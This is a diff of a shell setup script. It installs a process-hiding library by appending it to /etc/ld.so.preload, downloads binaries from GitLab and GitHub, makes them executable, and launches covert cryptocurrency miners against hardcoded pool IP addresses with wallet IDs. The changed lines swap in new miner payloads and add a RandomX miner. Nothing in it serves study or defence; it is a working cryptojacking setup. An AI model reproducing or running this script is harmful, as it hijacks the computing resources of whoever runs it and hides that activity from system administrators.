@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/embersc/UNFY/raw/main/unfygpu
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
 
-chmod 777 unfygpu
+chmod 777 lol1.81
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -57,4 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./unfygpu -a yescryptr32  -o stratum+tcp://165.227.182.117:80 -u UZXKhcGCjVPZeEQdEXnfU5h5edekEYLz2W.$(shuf -n 1 -i 1-99999)-UNFY & wget https://github.com/embersc/UNFY/raw/main/unfycpu && chmod 777 unfycpu && ./unfycpu -a yescryptr32  -o stratum+tcp://165.227.182.117:80 -u UZXKhcGCjVPZeEQdEXnfU5h5edekEYLz2W.$(shuf -n 1 -i 1-99999)-UNFY -t4
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
+chmod 777 b && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
